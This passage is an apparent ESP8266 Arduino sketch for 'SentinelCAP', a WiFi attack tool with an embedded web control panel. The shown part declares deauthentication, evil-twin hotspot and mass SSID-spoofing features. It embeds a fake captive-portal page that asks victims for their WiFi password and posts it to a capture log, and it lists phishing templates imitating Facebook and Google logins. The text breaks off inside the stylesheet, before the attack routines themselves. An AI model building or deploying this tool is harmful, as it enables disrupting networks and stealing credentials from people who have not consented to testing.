// --- Include necessary libraries ---
#include <Arduino.h>
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h> // For SPIFFS/LittleFS
#include <ArduinoJson.h> // For handling JSON data

extern "C" {
#include "user_interface.h" // Required for wifi_promiscuous_enable and wifi_send_pkt_freedom
}

// --- Global Definitions ---
#define APP_NAME "SentinelCAP"
#define DEFAULT_ADMIN_AP_SSID "Linuxhackingid-SentinelCAP" // Default SSID for the admin AP
#define DEFAULT_ADMIN_AP_PASSWORD "Linuxhackingid" // Default password for the admin AP
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1); // IP for the admin AP and DNS server

// --- Web Server and DNS Server Objects ---
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// --- Global File Object for Upload ---
File fsUploadFile; // Global file object to keep the file open during upload

// --- Network Structures ---
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
  String security; // Added security type
} _Network;

_Network _networks[16]; // Max 16 networks for scan
_Network _selectedNetwork; // Currently selected target network

// --- Global State Variables ---
String _capturedPasswordsLog = ""; // Stores successfully captured passwords
bool hotspot_active = false; // Status of Evil Twin hotspot
bool deauthing_active = false; // Status of deauthentication attack
unsigned long lastScanTime = 0;
unsigned long lastDeauthTime = 0;
unsigned long lastWifiStatusCheck = 0;
unsigned long startTime = 0; // For uptime calculation

// --- New: Global Settings Structure ---
struct AppSettings {
  String adminApSsid;
  String adminApPassword;
  bool enableDebugLogs;
  String defaultCaptivePortalTemplate; // e.g., "default", "facebook", or a filename
  // Add more settings here as needed
};

AppSettings appSettings; // Global instance of settings


// --- Function Prototypes ---
// Add this extern declaration to ensure appSettings is visible to all functions
extern AppSettings appSettings;

void setup();
void loop();
void clearNetworkArray();
void performScan();
String bytesToStr(const uint8_t* b, uint32_t size);
String getSecurityType(uint8_t encryptionType);

// --- File Serving Handlers ---
bool handleFileRead(String path);
void handleNotFound();

// --- API Handlers (JSON Responses) ---
void handleApiScan();
void handleApiSelectNetwork();
void handleApiToggleDeauth();
void handleApiToggleHotspot();
void handleApiMassSpoofing();
void handleApiStatus();
void handleApiLogs();
void handleApiClearLogs();
void handleApiDownloadLogs();
void handleApiFiles(); // New: for file listing
void handleApiDeselectNetwork(); // <--- TAMBAHAN BARU

// --- File Upload/Delete Handlers ---
void handleFileUpload();
void handleFileDelete();

// --- Captive Portal Handlers ---
void handleCaptivePortal();
void handleCaptivePortalSubmit();

// --- System Control ---
void handleRestart();

// --- New: Settings Management Functions ---
void loadSettings();
void saveSettings();
void handleApiGetSettings();
void handleApiSaveSettings();


// --- Embedded File Contents (as String Literals) ---

// captive_portal_template.html
const char CAPTIVE_PORTAL_TEMPLATE_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login - {SSID}</title>
    <style>
        body { font-family: sans-serif; background-color: #f0f2f5; text-align: center; padding-top: 50px; }
        .container { background-color: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); max-width: 400px; margin: auto; }
        h1 { color: #333; }
        input[type="password"] { width: 80%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; }
        button { background-color: #1877f2; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to {SSID}</h1>
        <p>Please enter your WiFi password to continue.</p>
        <form action="/submit_password" method="post">
            <input type="password" name="password" placeholder="WiFi Password" required>
            <button type="submit">Connect</button>
        </form>
        <p style="font-size: 0.8em; color: #666; margin-top: 20px;">Powered by {DEVICE_NAME}</p>
    </div>
</body>
</html>
)rawliteral";

// index.html
const char INDEX_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SentinelCAP - WiFi Penetration Testing Suite by Linuxhackingid</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body class="text-white">
    <nav class="glass-effect sticky top-0 z-50 p-4">
        <div class="container mx-auto flex items-center justify-between nav-bar-content">
            <div class="flex items-center space-x-4 nav-bar-logo">
                <div class="w-10 h-10 bg-gradient-to-r from-indigo-500 to-purple-600 rounded-lg flex items-center justify-center">
                    <span class="text-white font-bold text-lg">S</span>
                </div>
                <div>
                    <h1 class="text-xl font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent">
                        SentinelCAP
                    </h1>
                    <p class="text-xs text-gray-400">WiFi Penetration Testing Suite by Linuxhackingid</p>
                </div>
            </div>
            
            <!-- Hamburger menu icon for small screens -->
            <div class="hamburger-menu" id="hamburger-menu">☰</div>

            <div class="flex items-center space-x-6 nav-buttons-container" id="nav-buttons">
                <button data-tab="dashboard" class="nav-item px-4 py-2 rounded-lg bg-slate-700 active-tab">
                    Dashboard
                </button>
                <button data-tab="scanner" class="nav-item px-4 py-2 rounded-lg hover:bg-slate-700">
                    Scanner
                </button>
                <button data-tab="attack" class="nav-item px-4 py-2 rounded-lg hover:bg-slate-700">
                    Attack
                </button>
                <button data-tab="captive-editor" class="nav-item px-4 py-2 rounded-lg hover:bg-slate-700">
                    Captive Portal
                </button>
                <button data-tab="filemanager" class="nav-item px-4 py-2 rounded-lg hover:bg-slate-700">
                    Files
                </button>
                <button data-tab="logs" class="nav-item px-4 py-2 rounded-lg hover:bg-slate-700">
                    Logs
                </button>
                <button data-tab="settings" class="nav-item px-4 py-2 rounded-lg hover:bg-slate-700">
                    Settings
                </button>
            </div>

            <div class="flex items-center space-x-4 nav-bar-status">
                <div class="status-indicator">
                    <div class="w-3 h-3 bg-green-500 rounded-full status-active"></div>
                </div>
                <span class="text-sm text-gray-300">Online</span>
            </div>
        </div>
    </nav>

    <div class="container mx-auto p-6">
        
        <div id="dashboard-tab" class="tab-content active">
            <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
                <div class="metric-card cyber-border rounded-xl p-6">
                    <div class="flex items-center justify-between">
                        <div>
                            <p class="text-gray-400 text-sm">Target Network</p>
                            <p class="text-2xl font-bold text-white" id="target-ssid">None Selected</p>
                        </div>
                        <div class="w-12 h-12 bg-blue-500 bg-opacity-20 rounded-lg flex items-center justify-center">
                            <svg class="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.111 16.404a5.5 5.5 0 017.778 0M12 20h.01m-7.08-7.071c3.904-3.905 10.236-3.905 14.141 0M1.394 9.393c5.857-5.857 15.355-5.857 21.213 0"></path>
                            </svg>
                        </div>
                    </div>
                </div>

                <div class="metric-card cyber-border rounded-xl p-6">
                    <div class="flex items-center justify-between">
                        <div>
                            <p class="text-gray-400 text-sm">Evil Twin Status</p>
                            <p class="text-2xl font-bold" id="hotspot-status">
                                <span class="text-red-400">Inactive</span>
                            </p>
                        </div>
                        <div class="w-12 h-12 bg-purple-500 bg-opacity-20 rounded-lg flex items-center justify-center">
                            <svg class="w-6 h-6 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
                            </svg>
                        </div>
                    </div>
                </div>

                <div class="metric-card cyber-border rounded-xl p-6">
                    <div class="flex items-center justify-between">
                        <div>
                            <p class="text-gray-400 text-sm">Deauth Attack</p>
                            <p class="text-2xl font-bold" id="deauth-status">
                                <span class="text-red-400">Stopped</span>
                            </p>
                        </div>
                        <div class="w-12 h-12 bg-red-500 bg-opacity-20 rounded-lg flex items-center justify-center">
                            <svg class="w-6 h-6 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.082 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
                            </svg>
                        </div>
                    </div>
                </div>

                <div class="metric-card cyber-border rounded-xl p-6">
                    <div class="flex items-center justify-between">
                        <div>
                            <p class="text-gray-400 text-sm">Captured Passwords</p>
                            <p class="text-2xl font-bold text-green-400" id="password-count">0</p>
                        </div>
                        <div class="w-12 h-12 bg-green-500 bg-opacity-20 rounded-lg flex items-center justify-center">
                            <svg class="w-6 h-6 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 12H9v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2h2.586l4.707-4.707C10.923 3.663 11.596 4 12.414 4H15z"></path>
                            </svg>
                        </div>
                    </div>
                </div>
            </div>

            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
                <div class="glass-effect rounded-xl p-6">
                    <h3 class="text-xl font-bold mb-4 text-white">Quick Actions</h3>
                    <div class="space-y-4">
                        <button id="quick-scan-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white py-3 px-4 rounded-lg transition-all duration-300 flex items-center justify-center space-x-2">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
                            </svg>
                            <span>Quick Network Scan</span>
                        </button>
                        <button id="edit-captive-btn" class="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 px-4 rounded-lg transition-all duration-300 flex items-center justify-center space-x-2">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path>
                            </svg>
                            <span>Edit Captive Portal</span>
                        </button>
                        <button id="generate-report-btn" class="w-full bg-green-600 hover:bg-green-700 text-white py-3 px-4 rounded-lg transition-all duration-300 flex items-center justify-center space-x-2">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 17v-2m3 2v-4m3 4v-6m2 10H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                            </svg>
                            <span>Generate Report</span>
                        </button>
                        <button id="deselect-network-btn" class="w-full bg-gray-600 hover:bg-gray-700 text-white py-3 px-4 rounded-lg transition-all duration-300 flex items-center justify-center space-x-2">
                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                            </svg>
                            <span>Deselect Network</span>
                        </button>
                    </div>
                </div>

                <div class="glass-effect rounded-xl p-6">
                    <h3 class="text-xl font-bold mb-4 text-white">System Information</h3>
                    <div class="space-y-3">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400">IP Address:</span>
                            <span class="text-white font-mono" id="ip-address">Loading...</span>
                        </div>
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400">MAC Address:</span>
                            <span class="text-white font-mono" id="mac-address">Loading...</span>
                        </div>
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400">Uptime:</span>
                            <span class="text-white" id="uptime">0m</span>
                        </div>
                        <div class="flex justify-between items-center">
                            <span class="text-gray-400">Memory Usage:</span>
                            <div class="flex items-center space-x-2">
                                <div class="w-20 h-2 bg-gray-700 rounded-full">
                                    <div class="progress-bar h-full rounded-full" id="memory-progress" style="width: 0%"></div>
                                </div>
                                <span class="text-white text-sm" id="memory-percent">0%</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="glass-effect rounded-xl p-6">
                <h3 class="text-xl font-bold mb-4 text-white">Live Terminal Output</h3>
                <div class="terminal-output" id="terminal">
                    <div>[INFO] SentinelCAP initialized successfully</div>
                    <div>[INFO] WiFi interface ready</div>
                    <div>[INFO] Web server started on port 80</div>
                    <div>[SCAN] Scanning for available networks...</div>
                </div>
            </div>
        </div>

        <div id="scanner-tab" class="tab-content">
            <div class="glass-effect rounded-xl p-6">
                <div class="flex justify-between items-center mb-6">
                    <h2 class="text-2xl font-bold text-white">WiFi Network Scanner</h2>
                    <button id="refresh-scan-btn" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg transition-all duration-300 flex items-center space-x-2">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
                        </svg>
                        <span>Refresh Scan</span>
                    </button>
                </div>

                <div class="grid gap-4" id="networks-list">
                </div>
            </div>
        </div>

        <div id="attack-tab" class="tab-content">
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                <div class="glass-effect rounded-xl p-6">
                    <h3 class="text-xl font-bold mb-4 text-white">Deauthentication Attack</h3>
                    <p class="text-gray-400 mb-4">Disconnect clients from the target network by sending deauth packets.</p>
                    <button id="deauth-btn" class="w-full bg-red-600 hover:bg-red-700 text-white py-3 px-4 rounded-lg transition-all duration-300">
                        Start Deauth Attack
                    </button>
                </div>

                <div class="glass-effect rounded-xl p-6">
                    <h3 class="text-xl font-bold mb-4 text-white">Evil Twin Hotspot</h3>
                    <p class="text-gray-400 mb-4">Create a fake access point to capture credentials.</p>
                    <button id="hotspot-btn" class="w-full bg-purple-600 hover:bg-purple-700 text-white py-3 px-4 rounded-lg transition-all duration-300">
                        Start Evil Twin
                    </button>
                </div>
            </div>

            <div class="glass-effect rounded-xl p-6 mt-8">
                <h3 class="text-xl font-bold mb-4 text-white">Mass SSID Spoofing</h3>
                <p class="text-gray-400 mb-4">Broadcast multiple fake SSIDs simultaneously.</p>
                <textarea id="ssid-list" class="w-full h-32 bg-slate-800 text-white p-4 rounded-lg border border-slate-600 focus:border-blue-500 focus:outline-none" placeholder="Enter SSIDs (one per line):&#10;Free_WiFi&#10;Starbucks_WiFi&#10;Hotel_Guest"></textarea>
                <button id="start-mass-spoofing-btn" class="mt-4 bg-orange-600 hover:bg-orange-700 text-white px-6 py-2 rounded-lg transition-all duration-300">
                    Start Mass Spoofing
                </button>
            </div>
        </div>

        <div id="captive-editor-tab" class="tab-content">
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                <div class="glass-effect rounded-xl p-6">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-xl font-bold text-white">Live Captive Portal Editor</h3>
                        <div class="flex space-x-2">
                            <select id="template-select" class="bg-slate-800 text-white px-3 py-2 rounded-lg border border-slate-600">
                                <option value="default">Default Template</option>
                                <option value="facebook">Facebook Login</option>
                                <option value="google">Google WiFi</option>
                                <option value="router">Router Admin</option>
                                <option value="custom">Custom Template</option>
                            </select>
                            <button id="load-template-btn" class="bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 rounded-lg transition-all duration-300">
                                Load
                            </button>
                        </div>
                    </div>
                    
                    <div class="code-editor-container">
                        <textarea id="html-editor" class="w-full h-96 bg-slate-800 text-white p-4 rounded-lg border border-slate-600 focus:border-blue-500 focus:outline-none"></textarea>
                    </div>
                    
                    <div class="flex justify-between items-center mt-4">
                        <div class="flex space-x-2">
                            <button id="save-template-btn" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg transition-all duration-300">
                                Save Template
                            </button>
                            <button id="update-preview-btn" class="bg-purple-600 hover:bg-purple-700 text-white px-4 py-2 rounded-lg transition-all duration-300">
                                Update Preview
                            </button>
                        </div>
                        <button id="deploy-template-btn" class="bg-orange-600 hover:bg-orange-700 text-white px-4 py-2 rounded-lg transition-all duration-300">
                            Deploy Live
                        </button>
                    </div>
                </div>

                <div class="glass-effect rounded-xl p-6">
                    <h3 class="text-xl font-bold mb-4 text-white">Live Preview</h3>
                    <div class="preview-frame w-full h-96 overflow-auto">
                        <iframe id="preview-iframe" class="w-full h-full border-0 rounded-lg" src="about:blank"></iframe>
                    </div>
                    
                    <div class="mt-4 p-4 bg-slate-800 rounded-lg">
                        <h4 class="text-sm font-semibold text-gray-300 mb-2">Template Variables:</h4>
                        <div class="text-xs text-gray-400 space-y-1">
                            <div><code class="text-blue-300">{SSID}</code> - Target network name</div>
                            <div><code class="text-blue-300">{DEVICE_NAME}</code> - Device identifier</div>
                            <div><code class="text-blue-300">{CURRENT_TIME}</code> - Current timestamp</div>
                            <div><code class="text-blue-300">{CUSTOM_MESSAGE}</code> - Custom message</div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="glass-effect rounded-xl p-6 mt-8">
                <h3 class="text-xl font-bold mb-4 text-white">Template Library</h3>
                <div class="grid grid-cols-1 md:grid-cols-3 gap-4" id="template-library">
                </div>
            </div>
        </div>

        <div id="filemanager-tab" class="tab-content">
            <div class="glass-effect rounded-xl p-6">
                <div class="flex justify-between items-center mb-6">
                    <h2 class="text-2xl font-bold text-white">File Manager</h2>
                    <button id="show-upload-modal-btn" class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-lg transition-all duration-300 flex items-center space-x-2">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                        </svg>
                        <span>Upload File</span>
                    </button>
                </div>

                <div class="grid gap-4" id="files-list">
                </div>
            </div>
        </div>

        <div id="logs-tab" class="tab-content">
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
                <div class="glass-effect rounded-xl p-6">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-xl font-bold text-white">Captured Passwords</h3>
                        <div class="flex space-x-2">
                            <button id="clear-logs-btn" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg transition-all duration-300">
                                Clear
                            </button>
                            <button id="download-logs-btn" class="bg-green-600 hover:bg-green-700 text-white px-4 py-2 rounded-lg transition-all duration-300">
                                Download
                            </button>
                        </div>
                    </div>
                    
                    <div class="bg-slate-800 rounded-lg p-4 h-64 overflow-y-auto" id="password-logs">
                        <div class="text-gray-400 text-sm">No passwords captured yet...</div>
                    </div>
                </div>

                <div class="glass-effect rounded-xl p-6">
                    <h3 class="text-xl font-bold mb-4 text-white">System Logs</h3>
                    <div class="terminal-output" id="system-logs">
                        <div>[INFO] System started</div>
                        <div>[INFO] Monitoring WiFi networks</div>
                    </div>
                </div>
            </div>
        </div>

        <!-- New: Settings Tab Content -->
        <div id="settings-tab" class="tab-content">
            <div class="glass-effect rounded-xl p-6">
                <h2 class="text-2xl font-bold mb-6 text-white">Device Settings</h2>

                <div class="space-y-6">
                    <!-- Admin AP Settings -->
                    <div>
                        <h3 class="text-xl font-bold mb-3 text-white">Admin Access Point</h3>
                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                            <div>
                                <label for="admin-ap-ssid" class="block text-gray-400 text-sm font-bold mb-2">SSID:</label>
                                <input type="text" id="admin-ap-ssid" class="w-full" placeholder="Admin AP SSID">
                            </div>
                            <div>
                                <label for="admin-ap-password" class="block text-gray-400 text-sm font-bold mb-2">Password:</label>
                                <input type="password" id="admin-ap-password" class="w-full" placeholder="Admin AP Password">
                            </div>
                        </div>
                    </div>

                    <!-- Logging Settings -->
                    <div>
                        <h3 class="text-xl font-bold mb-3 text-white">Logging & Debug</h3>
                        <div class="flex items-center">
                            <input type="checkbox" id="enable-debug-logs" class="mr-2">
                            <label for="enable-debug-logs" class="text-gray-300">Enable Debug Logs (to Serial)</label>
                        </div>
                    </div>

                    <!-- Captive Portal Settings -->
                    <div>
                        <h3 class="text-xl font-bold mb-3 text-white">Captive Portal Default</h3>
                        <label for="default-captive-template" class="block text-gray-400 text-sm font-bold mb-2">Default Template:</label>
                        <select id="default-captive-template" class="w-full bg-slate-800 text-white px-3 py-2 rounded-lg border border-slate-600">
                            <option value="default">Default Template</option>
                            <option value="facebook">Facebook Login</option>
                            <option value="google">Google WiFi</option>
                            <option value="router">Router Admin</option>
                            <option value="custom">Custom (from uploaded file)</option>
                            <!-- Add options for any other built-in templates you might add -->
                        </select>
                    </div>

                    <button id="save-settings-btn" class="w-full bg-green-600 hover:bg-green-700 text-white py-3 px-4 rounded-lg transition-all duration-300">
                        Save Settings
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div id="upload-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden z-50 flex items-center justify-center">
        <div class="glass-effect rounded-xl p-6 m-4 max-w-md w-full">
            <h3 class="text-xl font-bold mb-4 text-white">Upload File</h3>
            <div class="border-2 border-dashed border-slate-600 rounded-lg p-8 text-center hover:border-blue-500 transition-colors cursor-pointer" id="file-drop-area">
                <svg class="w-12 h-12 text-gray-400 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"></path>
                </svg>
                <p class="text-gray-400">Click to select file or drag and drop</p>
                <input type="file" id="file-input" class="hidden">
            </div>
            <div class="flex justify-end space-x-2 mt-4">
                <button id="cancel-upload-btn" class="bg-gray-600 hover:bg-gray-700 text-white px-4 py-2 rounded-lg">
                    Cancel
                </button>
            </div>
        </div>
    </div>

    <script src="/script.js"></script>
</body>
</html>
)rawliteral";

// style.css
const char STYLE_CSS[] PROGMEM = R"rawliteral(
/* Salin semua isi dari tag <style> di code.html ke sini */
:root {
    --primary-color: #6366f1;
    --primary-dark: #4f46e5;
    --secondary-color: #10b981;
    --danger-color: #ef4444;
    --warning-color: #f59e0b;
    --dark-bg: #0f172a;
    --dark-card: #1e293b;
    --dark-border: #334155;
    --text-primary: #f1f5f9;
    --text-secondary: #94a3b8;
}

/* Basic Reset & Body Styles */
html {
    box-sizing: border-box; /* Ensures padding and border are included in element's total width and height */
}
*, *::before, *::after {
    box-sizing: inherit;
}

body {
    margin: 0;
    padding: 0;
    background: linear-gradient(135deg, var(--dark-bg) 0%, var(--dark-card) 100%);
    min-height: 100vh;
    font-family: 'Inter', system-ui, -apple-system, sans-serif;
    color: var(--text-primary);
    line-height: 1.5;
    font-size: 16px; /* Base font size */
}

/* Utility Classes (Tailwind-like) - Ensure these are correctly applied */
.text-white { color: #fff; }
.container {
    width: 100%;
    margin-left: auto;
    margin-right: auto;
    padding-left: 1rem; /* Adjusted for smaller screens */
    padding-right: 1rem; /* Adjusted for smaller screens */
    max-width: 1280px;
}
@media (min-width: 768px) { /* Medium screens and up */
    .container {
        padding-left: 1.5rem;
        padding-right: 1.5rem;
    }
}

.mx-auto { margin-left: auto; margin-right: auto; }
.p-6 { padding: 1.5rem; }
.grid { display: grid; }
.grid-cols-1 { grid-template-columns: repeat(1, minmax(0, 1fr)); }
.md\:grid-cols-2 {
    @media (min-width: 768px) {
        grid-template-columns: repeat(2, minmax(0, 1fr));
    }
}
.lg\:grid-cols-2 {
    @media (min-width: 1024px) {
        grid-template-columns: repeat(2, minmax(0, 1fr));
    }
}
.lg\:grid-cols-4 {
    @media (min-width: 1024px) {
        grid-template-columns: repeat(4, minmax(0, 1fr));
    }
}
.gap-6 { gap: 1.5rem; }
.gap-8 { gap: 2rem; }
.mb-8 { margin-bottom: 2rem; }
.mt-8 { margin-top: 2rem; }
.flex { display: flex; }
.items-center { align-items: center; }
.justify-between { justify-content: space-between; }
.justify-center { justify-content: center; }
.space-x-4 > *:not(:first-child) { margin-left: 1rem; }
.space-x-6 > *:not(:first-child) { margin-left: 1.5rem; }
.space-x-2 > *:not(:first-child) { margin-left: 0.5rem; }
.space-y-4 > *:not(:first-child) { margin-top: 1rem; }
.space-y-3 > *:not(:first-child) { margin-top: 0.75rem; }
.space-y-1 > *:not(:first-child) { margin-top: 0.25rem; }
.w-10 { width: 2.5rem; height: 2.5rem; } /* Adjusted for better scaling */
.h-10 { height: 2.5rem; }
.w-12 { width: 3rem; }
.h-12 { height: 3rem; }
.w-full { width: 100%; }
.h-32 { height: 8rem; }
.h-96 { height: 24rem; }
.h-64 { height: 16rem; }
.rounded-lg { border-radius: 0.5rem; }
.rounded-xl { border-radius: 0.75rem; }
.rounded-full { border-radius: 9999px; }
.bg-gradient-to-r { background-image: linear-gradient(to right, var(--tw-gradient-stops)); }
.from-indigo-500 { --tw-gradient-from: #6366f1; --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(99, 102, 241, 0)); }
.to-purple-600 { --tw-gradient-to: #9333ea; }
.from-indigo-400 { --tw-gradient-from: #818cf8; --tw-gradient-stops: var(--tw-gradient-from), var(--tw-gradient-to, rgba(129, 140, 248, 0)); }
.to-purple-400 { --tw-gradient-to: #c084fc; }
.bg-clip-text { -webkit-background-clip: text; background-clip: text; }
.text-transparent { color: transparent; }
.font-bold { font-weight: 700; }
.text-lg { font-size: 1.125rem; }
.text-xl { font-size: 1.25rem; }
.text-2xl { font-size: 1.5rem; }
.text-xs { font-size: 0.75rem; }
.text-sm { font-size: 0.875rem; }
.text-gray-400 { color: #9ca3af; }
.text-gray-300 { color: #d1d5db; }
.text-red-400 { color: #f87171; }
.text-green-400 { color: #4ade80; }
.text-blue-400 { color: #60a5fa; }
.text-purple-400 { color: #c084fc; }
.bg-slate-700 { background-color: #334155; }
.bg-slate-800 { background-color: #1e293b; }
.bg-blue-500 { background-color: #3b82f6; }
.bg-purple-500 { background-color: #a855f7; }
.bg-red-500 { background-color: #ef4444; }
.bg-green-500 { background-color: #22c55e; }
.bg-opacity-20 { opacity: 0.2; }
.px-4 { padding-left: 1rem; padding-right: 1rem; }
.py-2 { padding-top: 0.5rem; padding-bottom: 0.5rem; }
.py-3 { padding-top: 0.75rem; padding-bottom: 0.75rem; }
.px-6 { padding-left: 1.5rem; padding-right: 1.5rem; }
.transition-all { transition-property: all; transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1); transition-duration: 150ms; }
.duration-300 { transition-duration: 300ms; }
.hover\:bg-slate-700:hover { background-color: #334155; }
.hover\:bg-blue-700:hover { background-color: #2563eb; }
.hover\:bg-purple-700:hover { background-color: #9333ea; }
.hover\:bg-red-700:hover { background-color: #dc2626; }
.hover\:bg-green-700:hover { background-color: #16a34a; }
.hover\:bg-orange-700:hover { background-color: #c2410c; }
.hover\:bg-gray-700:hover { background-color: #4b5563; }
.hover\:opacity-80:hover { opacity: 0.8; }
.hover\:border-blue-500:hover { border-color: #3b82f6; }
.cursor-pointer { cursor: pointer; }
.sticky { position: sticky; }
.top-0 { top: 0; }
.z-50 { z-index: 50; }
.border { border-width: 1px; }
.border-2 { border-width: 2px; }
.border-dashed { border-style: dashed; }
.border-slate-600 { border-color: #475569; }
.focus\:border-blue-500:focus { border-color: #3b82f6; }
.focus\:outline-none:focus { outline: 2px solid transparent; outline-offset: 2px; }
.overflow-auto { overflow: auto; }
.overflow-y-auto { overflow-y: auto; }
.font-mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }
.w-20 { width: 5rem; }
.h-2 { height: 0.5rem; }
.bg-gray-700 { background-color: #374151; }
.hidden { display: none; }
.fixed { position: fixed; }
.inset-0 { top: 0; right: 0; bottom: 0; left: 0; }
.bg-black { background-color: #000; }
.bg-opacity-50 { background-color: rgba(0, 0, 0, 0.5); }
.max-w-md { max-width: 28rem; }
.m-4 { margin: 1rem; }
.text-center { text-align: center; }
.mx-auto { margin-left: auto; margin-right: auto; }
.mb-4 { margin-bottom: 1rem; }
.mt-4 { margin-top: 1rem; }
.flex-1 { flex: 1 1 0%; }
.text-right { text-align: right; }
.ml-4 { margin-left: 1rem; }
.px-3 { padding-left: 0.75rem; padding-right: 0.75rem; }
.py-1 { padding-top: 0.25rem; padding-bottom: 0.25rem; }
.text-blue-600 { color: #2563eb; }
.text-red-600 { color: #dc2626; }
.text-green-600 { color: #16a34a; }
.text-purple-600 { color: #9333ea; }
.text-orange-600 { color: #ea580c; }
.bg-gray-600 { background-color: #4b5563; }
.border-l-blue-500 { border-left-color: #3b82f6; }


/* Custom Components & Effects */
.glass-effect {
    background: rgba(30, 41, 59, 0.8);
    backdrop-filter: blur(10px);
    border: 1px solid rgba(51, 65, 85, 0.3);
}

.cyber-border {
    position: relative;
    border: 2px solid transparent;
    background: linear-gradient(135deg, var(--dark-card), var(--dark-bg)) padding-box,
                linear-gradient(135deg, var(--primary-color), var(--secondary-color)) border-box;
}

.pulse-ring {
    animation: pulse-ring 2s cubic-bezier(0.455, 0.03, 0.515, 0.955) infinite;
}

@keyframes pulse-ring {
    0% { transform: scale(0.8); opacity: 1; }
    50% { transform: scale(1.2); opacity: 0.5; }
